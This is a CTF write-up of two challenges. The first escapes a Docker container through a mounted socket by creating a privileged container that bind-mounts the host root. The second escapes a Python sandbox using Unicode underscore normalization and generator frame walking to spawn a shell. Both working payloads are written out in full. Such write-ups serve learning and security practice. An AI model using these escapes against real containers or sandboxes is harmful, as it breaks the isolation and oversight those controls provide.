You are root, but it seems you are inside a Docker container. Can you escape somehow once again?

**Solution**

Docker socket is mounted into the container as `/run/docker/docker.sock` - this is not real docker but some FastAPI implementation (I guess for the CTF?), you can find `openapi.json` description and craft a container creation that would have the whole host root mounted into it - that gives you the flag, no need to actually make the container.

```shell
curl --unix-socket /run/docker/docker.sock http://localhost/openapi.json
```


```shell
curl --unix-socket /run/docker/docker.sock http://localhost/v1.48/containers/json
```
and 

```shell
root@0751d0e17cd7:~# curl --unix-socket /run/docker/docker.sock -X POST \
>   -H "Content-Type: application/json" \
>   -d '{
>     "Image": "alpine",
>     "Cmd": ["chroot", "/mnt", "/bin/sh"],
>     "HostConfig": {
>       "Binds": ["/:/mnt"],
>       "Privileged": true
>     }
>   }' \
>   http://localhost/v1.48/containers/create?name=escape
{"message":"SK-CERT{4nd_7hat5_h0W_U_3scaP3_A_D0cK3r_c0nt41ne6}"}
```


> thats it for the jaille challenge one

### **challenge2**
# [★★☆] JAILE2

[](https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/tree/main/JAILE2/Calculator%20v2#-jaile2)

## Calculator v2

`exp.cybergame.sk:7011`

`calculatorv2.zip`

*Solution*

It seems we cannot use any underscores—that might be challenging; Python internals rely on a LOT of dunder magic methods (all the `__something__`).

After a few research ,I learned that *Python uses Unicode NFKC normalization before it executes code*. So we can _potentially_ sneak in some underscores, but it is not that easy. The important part is that not all Unicode characters are classified as `XID_Start` - meaning an identifier **cannot** begin with these characters, they are classified as `XID_Continue` instead - that means they can be a second or subsequent letters, but not the first.

I asked chat-gpt to write for me an `underscores.py` 
```python
import unicodedata

chars = [
    # isidentifier() means if it can be used as a first letter of a variable
    f"U+{ord(c):04X} ({unicodedata.name(c)}) – {'XID_Start' if c.isidentifier() else 'XID_Continue'}"
    for i in range(0x110000)
    if unicodedata.normalize('NFKC', chr(i)) == '_'
    for c in [chr(i)]
]

print("\n".join(chars))
```
to find everything that *NFKC normalization* will turn into *0x5F* ( `_`) - a regular ASCII underscore.

```
python3 underscores.py
U+005F (LOW LINE) – XID_Start
U+FE33 (PRESENTATION FORM FOR VERTICAL LOW LINE) – XID_Continue
U+FE34 (PRESENTATION FORM FOR VERTICAL WAVY LOW LINE) – XID_Continue
U+FE4D (DASHED LOW LINE) – XID_Continue
U+FE4E (CENTRELINE LOW LINE) – XID_Continue
U+FE4F (WAVY LOW LINE) – XID_Continue
U+FF3F (FULLWIDTH LOW LINE) – XID_Continue
```

Ok, so the only character that can actually be used at the start of an identifier is the real 0x5F ASCII underscore. TL;DR is - **we cannot use dunder identifiers (methods or attributes) at all**.

What caught my eye in the links above was the use of frames:

```python
# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
```

Although there are underscores in these identifiers, they are **not** the first character, so we **can** use our normalization trick to get around the limitation in these specific cases.

The idea is to use `f_back` on a `frame` to "walk out of the eval" and be able to reach globals and builtins that are not limited. I was debugging this locally, I came up with this:

```python
f"{(lambda g: (g.send(None), g)[1])((i for i in [0])).gi﹍frame.f﹍back.f﹍back.f﹍builtins['\x5f\x5fimport\x5f\x5f']('os').system('sh')}"
```

After a lot of trials/errors and researching, I came across [this SSTF 2023 CTF pyJail](https://gist.github.com/lebr0nli/c2c0f42757f05813e3282c22114abe82).

They created an array, then a generator on top of that, and then appended that generator into the array it was generating upon. *juicy!!!!* Exactly.

So, the hunch of using a frame and walking it back with `f_back` was right all along, we just needed to convince the garbage collector to not clear the `f_back` frames and here it is achieved by the cyclic reference.

```python
[a := [], g := (g.gi﹍frame.f﹍back.f﹍back.f﹍builtins['\x5f\x5fimport\x5f\x5f']('os').system('sh') for g in a),
 a.append(g), g.send(None)]
```

Flag

```
SK-CERT{wh0_w0uld_h4v3_th0ght_y0u_c4n_3sc4pe_w1th0ut__}
```

>Thats it on Python jails i managed a few.

---

>References and resources that helped so do so:
- [https://github.com/HackTricks-wiki/hacktricks/tree/master/src/generic-methodologies-and-resources/python/bypass-python-sandboxes](https://github.com/HackTricks-wiki/hacktricks/tree/master/src/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass](https://shirajuki.js.org/blog/pyjail-cheatsheet#unicode-bypass)
- [https://github.com/jailctf/pyjail-collection](https://github.com/jailctf/pyjail-collection)
